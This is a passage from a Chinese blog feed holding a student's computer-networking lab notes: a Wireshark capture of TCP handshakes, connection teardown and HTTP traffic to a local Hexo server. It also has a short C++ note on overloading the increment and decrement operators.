src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210922486310_715_20221119192135114475_628_image-20221119184351874.png" alt="image-20221119184351874"><figcaption aria-hidden="true">image-20221119184351874</figcaption></figure><p>接收端：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210923536028_235_20221119192137753520_483_image-20221119184414935.png" alt="image-20221119184414935"><figcaption aria-hidden="true">image-20221119184414935</figcaption></figure><p>发送端没有进行文件发送，接收端超时退出：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210924447506_576_20221119192140166643_147_image-20221119184511051.png" alt="image-20221119184511051"><figcaption aria-hidden="true">image-20221119184511051</figcaption></figure><p>异常丢包提示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210925394972_118_20221119192142733601_999_image-20221119184627493.png" alt="image-20221119184627493"><figcaption aria-hidden="true">image-20221119184627493</figcaption></figure><p>发送端文件发送完毕：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210926345559_488_20221119192145332007_368_image-20221119184759988.png" alt="image-20221119184759988"><figcaption aria-hidden="true">image-20221119184759988</figcaption></figure><p>多文件接收</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.1-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/20230828210927763460_372_20221119192148152631_686_image-20221119185617149.png" alt="image-20221119185617149"><figcaption aria-hidden="true">image-20221119185617149</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验二_Wireshark分析交互过程</title>
    <link href="/posts/13596/"/>
    <url>/posts/13596/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验二_wireshark分析交互过程">计算机网络实验二_Wireshark分析交互过程</h1><h2 id="实验要求">实验要求</h2><p>（1）搭建Web服务器（自由选择系统），并制作简单的Web页面，包含简单文本信息（至少包含专业、学号、姓名）和自己的LOGO。</p><p>（2）通过浏览器获取自己编写的Web页面，使用Wireshark捕获浏览器与Web服务器的交互过程，并进行简单的分析说明</p><ul><li>主要分析的是tcp握手、http请求应答、tcp挥手几个过程和相关问题</li></ul><h2 id="wireshark可以做什么"><a href="https://zhuanlan.zhihu.com/p/82498482">Wireshark可以做什么</a></h2><ul><li>网络管理员使用Wireshark检测网络问题</li><li>网安工程师用Wireshark检查信息安全相关问题</li><li>开发者使用Wireshark为新的通信协议调试</li><li>普通用户使用Wireshark学习网络协议相关知识</li><li>憨憨学生使用Wireshark应付TCP/IP课程要求(别骂了)</li></ul><h2 id="服务器搭建">服务器搭建</h2><p>在本次实验中我使用了本地服务器。我们可以使用Springboot，flask等在localhost上搭建Web服务器。不过最近恰好在研究博客搭建相关内容，这里通过使用Hexo搭建静态博客的比较“自动化”的方式在本机搭建Web服务器。</p><p>通过下面命令安装<code>hexo</code>环境。(其实还需要安装<code>npm</code>环境，不过在此就略去了)。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6gigm1lna3fjks"></i><span>shell</span><div class="collapse show" id="collapse-6gigm1lna3fjks"><pre><code class="hljs shell">sudo npm install -g hexo-cli</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8c193mlna3fjks"></i><span>shell</span><div class="collapse show" id="collapse-8c193mlna3fjks"><pre><code class="hljs shell">hexo init my_hexo_test_servercd my_hexo_test_servernpm install</code></pre></div></div><p>新建博客目录结构如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-da9icklna3fjks"></i><span>shell</span><div class="collapse show" id="collapse-da9icklna3fjks"><pre><code class="hljs shell">my_hexo_test_server.├── _config.yml├── db.json├── node_modules├──...├── package-lock.json├── package.json├── public├── scaffolds├── source│&nbsp;&nbsp; └── _posts└── themes    └── wireshark        ├── _config.yml        ├── layout        │&nbsp;&nbsp; ├── index.ejs        │&nbsp;&nbsp; ├── layout.ejs        │&nbsp;&nbsp; └── post.ejs        └── source            ├── css            ├── img            └── js</code></pre></div></div><p><code>_config.yml</code>中<code>theme</code>改为自定义的<code>wireshark</code>，在<code>index.ejs</code>中写入网页内容：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xqgsq8lna3fjks"></i><span>html</span><div class="collapse show" id="collapse-xqgsq8lna3fjks"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>this is layout.ejs<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> 2013599 田佳业<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>计算机科学与技术<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"img/test.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div></div><p>在终端执行 </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jnj4v4lna3fjks"></i><span>shell</span><div class="collapse show" id="collapse-jnj4v4lna3fjks"><pre><code class="hljs shell">hexo ghexo s</code></pre></div></div><p></p><p>可以看到生成网页如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210657935762_127_20221028232042709573_203_image-20221026200601767.png" alt="image-20221026200601767"><figcaption aria-hidden="true">image-20221026200601767</figcaption></figure><h2 id="wireshark-分析tcp连接过程">Wireshark 分析TCP连接过程</h2><p>由于服务器在本地，选择<code>Loopback:lo0</code>即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210700374694_433_20221028232044366413_373_image-20221026200751668.png" alt="image-20221026200751668"><figcaption aria-hidden="true">image-20221026200751668</figcaption></figure><p>首先我们需要尝试找到TCP建立连接三次握手的位置。刷新网页，并输入<code>http</code>进行过滤，以隐藏其他无关的数据包。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210701652648_872_20221028232045903947_824_image-20221028173616526.png" alt="image-20221028173616526">找到第一个<code>GET</code>数据包。右键选中，<code>Follow stream</code>——<code>TCPstream</code>，显示握手信息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210702797226_521_20221028232048121868_131_image-20221028174135897.png" alt="image-20221028174135897"><figcaption aria-hidden="true">image-20221028174135897</figcaption></figure><h3 id="三次握手">三次握手</h3><p>下面展示了三次握手的过程，并结合握手信息对照报文段进行分析：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210704135079_964_20221028232049728449_411_image-20221028175332107.png" alt="image-20221028175332107"><figcaption aria-hidden="true">image-20221028175332107</figcaption></figure><ul><li>第一次握手：建立连接时，客户端发送SYN包（Seq=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（SynchronizeSequence Numbers）。</li></ul><p>捕获的第一段报文如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210705714512_581_20221028232051494572_180_image-20221028174837176.png" alt="image-20221028174837176"><figcaption aria-hidden="true">image-20221028174837176</figcaption></figure><p>博客示例网页运行在<code>localhost:4000</code>，目的端口号匹配。同时可以看到Flag字段值为2，也即第二位SYN字段为1，其余全0。</p><ul><li>第二次握手：服务器收到SYN包，必须确认客户的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</li></ul><p>第二段报文如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210707089949_308_20221028232054080895_215_image-20221028175454476.png" alt="image-20221028175454476"><figcaption aria-hidden="true">image-20221028175454476</figcaption></figure><p>从端口号可以看出，这是服务器发给客户的。Flag字段为ACK和SYN。这次我们注意一下确认序列号的值。从<a href="https://wiki.wireshark.org/TCP_Relative_Sequence_Numbers">WiresharkWiki</a>我们可以了解到，考虑到可读性其在列表中采用了相对序列号。在详细信息中可以看到原始(<code>raw</code>)序列号。我们可以看到：</p><p>第一次握手客户端<code>Sequence Number (raw):2932922641</code>（Seq=j）</p><p>第二次握手服务器端<code>Acknowledgment number (raw):2932922642</code>（ACK=j+1），与示意图中的握手过程的过程相符。</p><ul><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手，客户端与服务器开始传送数据。</li></ul><p>同样可以验证ACK(ack=k+1）。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210708887036_756_20221028232056001837_289_image-20221028180628702.png" alt="image-20221028180628702"><figcaption aria-hidden="true">image-20221028180628702</figcaption></figure><p>也可对照查看右侧的十六进制报文源码。</p><h4 id="过程理解">过程理解</h4><p class="note note-primary">为什么是三次握手？</p><p>需要以最小的代价验证会话双方的收发功能正常:</p><ul><li><p>第一次握手成功：说明客户端的数据可以被服务端收到，说明客户端的发功能可用，说明服务端的收功能可用。但客户端自己不知道数据是否被接收。</p></li><li><p>第二次握手成功：说明服务端的数据可以被客户端收到，说明服务端的发功能可用，说明客户端的收功能可用。同时客户端知道自己的数据已经正确到达服务端，自己的发功能正常。但是服务端自己不知道数据是否被接收。</p></li><li><p>第三次握手成功：说明服务端知道自己的数据已经正确到达客户端端，自己的发功能正常。至此服务成功建立。</p></li></ul><p class="note note-primary">为什么每次连接的序列号都不同？</p><p>避免新老连接混淆</p><h4 id="syn洪泛攻击">Syn洪泛攻击</h4><p>在 TCP 连接的三次握手过程中，我们假设发生以下情况：</p><p>一个用户向服务器发送了 Syn报文后突然死机或掉线, 则服务器在发出 SYN和ACK 应答报文后，客户端无法及时答复，导致服务器无法收到客户端的 ACK报文( 即第三次握手无法完成) 。</p><p>这种情况下服务器端一般会重试并等待一段时间后丢弃这个未完成的连接,称为<strong>半连接握手状态。</strong></p><p>攻击者只需要向服务端发送大量的TCP请求连接而不进行第三次回应，就会出现大量的这种半握手状态的连接,在服务器产生很多的请求队列,<strong>由于第一次握手时服务端就已经为客户端开辟了接收缓冲区</strong>，大量的请求最后的结果往往是堆栈溢出崩溃,服务器也将忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求,此时服务器失去了对客户端的响应, 从而达到SynFlood攻击的目的。</p><p><a href="https://zhuanlan.zhihu.com/p/457884093">DoS攻击之Syn洪泛攻击原理及防御</a></p><h3 id="四次挥手">四次挥手</h3><p>左边的实线连起来的表示同一次会话发生的各个阶段。沿着这条线走到最底端，可以看到四次挥手的过程。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210711202693_873_20221028232058311718_623_image-20221028181245513.png" alt="image-20221028181245513"><figcaption aria-hidden="true">image-20221028181245513</figcaption></figure><p>结合TCP连接关闭的过程，可以看到第81到84个报文是挥手的过程。分析方式与握手类似，在此不再赘述。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210712345252_558_20221028232100061679_207_image-20221028181501786.png" alt="image-20221028181501786"><figcaption aria-hidden="true">image-20221028181501786</figcaption></figure><p>另外，其实两端中的任何一个都可以主动提出关闭连接。只是通常情况下是客户端。</p><h4 id="过程理解-1">过程理解</h4><p class="note note-primary">第二次挥手和第三次挥手一定是紧挨着的吗？</p>不一定。这时候只是表示A不再发送数据。服务器仍可在这两次挥手中间发送一些数据。<p class="note note-primary">为什么第四次挥手后A不能立刻释放资源？</p>A并不知道B有没有正确的收到了A的ACK。正常情况下什么也不会发生。<strong>但如果没收到，B应当重传FIN</strong>，A得知道<p class="note note-primary">为什么要等两倍MSL？</p><p>无论是否正常，A都需要等待，要取这两种情况等待时间的最大值，以应对最坏的情况发生，这个最坏情况是：去向ACK消息最大存活时间（MSL) + 来向FIN消息的最大存活时间(MSL)。</p><p class="note note-primary">一定要四次挥手吗？</p><p>两次握手就可以释放一端到另一端的 TCP 连接</p><p>客户端和服务端的生命周期总结如下：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210715568267_759_20221028232101334092_481_image-20221028181827531.png" alt="image-20221028181827531"><figcaption aria-hidden="true">image-20221028181827531</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210717454207_339_20221028232103339683_762_image-20221028181835974.png" alt="image-20221028181835974"><figcaption aria-hidden="true">image-20221028181835974</figcaption></figure><h3 id="传输窗口">传输窗口</h3><h4 id="tcp-window-scale">TCP Window Scale</h4><p>在TCP刚被发明的时候，全世界的网络带宽都很小，所以最大接收窗口被定义成65535字节。随着硬件的革命性进步，65535字节已经成为性能瓶颈了，怎么样才能扩展呢？TCP头中只给接收窗口值留了 16 bit，肯定是无法突破 65535 （<span class="math inline">\(2^{16} − 1\)</span>）的。 1992年的 RFC1323中提出了一个解决方案，就是在三次握手时，把自己的 WindowScale信息告知对方。由于 Window Scale放在 TCP头之外的Options中，所以不需要修改 TCP头的设计。 WindowScale的作用是向对方声明一个 Shift count，我们把它作为 2的指数，再乘以TCP头中定义的接收窗口，就得到真正的 TCP接收窗口了。</p><p>这对应于Wireshark中的Caculated window size，如下图所示。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210719179687_261_20221028232105453916_456_image-20221028184429901.png" alt="image-20221028184429901"><figcaption aria-hidden="true">image-20221028184429901</figcaption></figure><h2 id="http传输分析">Http传输分析</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210720298497_440_20221028232107541741_783_image-20221028190921283.png" alt="image-20221028190921283"><figcaption aria-hidden="true">image-20221028190921283</figcaption></figure><p>以下是前三个HTTP传输报文。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210721857050_893_20221028232109214457_454_image-20221028191110711.png" alt="image-20221028191110711"><figcaption aria-hidden="true">image-20221028191110711</figcaption></figure><p>查看第一次客户端向服务器发送GET请求，含有浏览器请求头以及请求行。GET方法没有请求体。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210723036742_240_20221028232111055813_462_image-20221028190632604.png" alt="image-20221028190632604"><figcaption aria-hidden="true">image-20221028190632604</figcaption></figure><p>从右边解析出的明文可以看出HTTP是采用ASCII码进行传输的。</p><p>之后请求成功，返回200状态码及HTML。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210725379619_811_20221028232113806376_581_image-20221028191208877.png" alt="image-20221028191208877"><figcaption aria-hidden="true">image-20221028191208877</figcaption></figure><p>分析文本的十六进制编码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-auf2inlna3fjks"></i><span>apache</span><div class="collapse show" id="collapse-auf2inlna3fjks"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">20</span> <span class="hljs-number">3</span>c <span class="hljs-number">68</span> <span class="hljs-number">32</span> <span class="hljs-number">3</span>e <span class="hljs-number">20</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span><span class="hljs-attribute">0010</span>   <span class="hljs-number">20</span> e7 <span class="hljs-number">94</span> b0 e4 bd b3 e4 b8 <span class="hljs-number">9</span>a <span class="hljs-number">3</span>c <span class="hljs-number">2</span>f <span class="hljs-number">68</span> <span class="hljs-number">32</span> <span class="hljs-number">3</span>e <span class="hljs-number">0</span>a</code></pre></div></div><p>第一行末尾可以看到是我的学号<code>2013599</code>的ASCII码。</p><p>中文采用的是Unicode编码。具体方式为：</p><blockquote><p>将需要转码的字符，按指定编码方式（默认使用UTF-8编码）转化为字节流，每个字节按16进制表示，并添加%组成一个percent编码。</p></blockquote><p>给第二行每个字节前加%后用UrlDecode解码，可以还原出我的名字。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210728206705_896_20221028232117064239_862_image-20221028193717733.png" alt="image-20221028193717733"><figcaption aria-hidden="true">image-20221028193717733</figcaption></figure><p>再之后请求图片：</p><p>同时我们可以看到图片信息也请求成功。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%BA%8C_Wireshark%E5%88%86%E6%9E%90%E4%BA%A4%E4%BA%92%E8%BF%87%E7%A8%8B/20230828210729172278_543_20221028232118651904_458_image-20221028194251309.png" alt="image-20221028194251309"><figcaption aria-hidden="true">image-20221028194251309</figcaption></figure><blockquote><p>在 <code>vim</code> 内调用 <code>:%!xxd</code>命令，其实就是调用系统的 <code>xxd</code>命令，对打开的内容进行16进制转换。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++运算符重载</title>
    <link href="/posts/53807/"/>
    <url>/posts/53807/</url>
    
    <content type="html"><![CDATA[<h1 id="c运算符重载">C++运算符重载</h1><p>关于重载自增自减运算符的一些深入讨论：</p><p><a href="http://c.biancheng.net/view/247.html">参考</a></p><p>通常我们重载前置<code>++</code>运算符的返回值类型是 Obj&amp;，而后置<code>++</code>运算符的返回值类型是Obj，这是因为运算符重载最好保持原运算符的用法。C++固有的前置<code>++</code>运算符的返回值本来就是操作数的引用，而后置<code>++</code>运算符的返回值则是操作数值修改前的复制品。</p><p>例如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4m4os3lmrh9u63"></i><span>C++</span><div class="collapse show" id="collapse-4m4os3lmrh9u63"><pre><code class="hljs C++"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;(++a) = <span class="hljs-number">2</span>;</code></pre></div></div><p>上面两条语句执行后，a 的值是 2，因为 ++a 的返回值是 a 的引用。而</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rah2drlmrh9u63"></i><span>C++</span><div class="collapse show" id="collapse-rah2drlmrh9u63"><pre><code class="hljs C++">(a++) = <span class="hljs-number">2</span>;</code></pre></div></div><p>这条语句是非法的，因为 a++ 的返回值不是引用，不能作为左值。</p><p>换句话说，前置<code>++</code>返回左值，后置<code>++</code>返回右值。</p><p>当然，如果我们还重载了对象的加减等运算符，希望自增自减参与对象的这些运算，返回的应当是对象(这也是推荐的做法)，如果希望得到自增自减的“数值”，可以返回<code>int</code>。</p><p>但如果重载后置运算符时返回的是引用，有可能破坏类的封装性。如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-22sei7lmrh9u63"></i><span>c++</span><div class="collapse show" id="collapse-22sei7lmrh9u63"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Sample</span>{    <span class="hljs-type">int</span> n;<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Sample</span>():<span class="hljs-built_in">n</span>(<span class="hljs-number">0</span>){}    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Sample</span><span class="hljs-params">(<span class="hljs-type">int</span> m)</span></span>{n=m;};    <span class="hljs-type">int</span>&amp; <span class="hljs-keyword">operator</span>--(<span class="hljs-type">int</span>){        n--;        <span class="hljs-keyword">return</span> n;    }    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">disp</span><span class="hljs-params">()</span></span>{        cout&lt;&lt;n&lt;&lt;endl;    }};<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{    <span class="hljs-function">Sample <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;    (s--)++;    s.<span class="hljs-built_in">disp</span>();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>(s--)</code>直接返回内部私有变量<code>n</code>的引用，则外部的++可越过限制改变其值。</p><h2 id="继承和多态">继承和多态</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/C%2B%2B%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/20230828205656079244_989_20230519102654183213_668_image-20230421161915507.png" alt="image-20230421161915507"><figcaption aria-hidden="true">image-20230421161915507</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/C%2B%2B%E8%BF%90%E7%AE%97%E7%AC%A6%E9%87%8D%E8%BD%BD/20230828205657987626_516_20230519102655890997_284_image-20230421161949156.png" alt="image-20230421161949156"><figcaption aria-hidden="true">image-20230421161949156</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验一_socket聊天程序</title>
    <link href="/posts/54779/"/>
    <url>/posts/54779/</url>
    
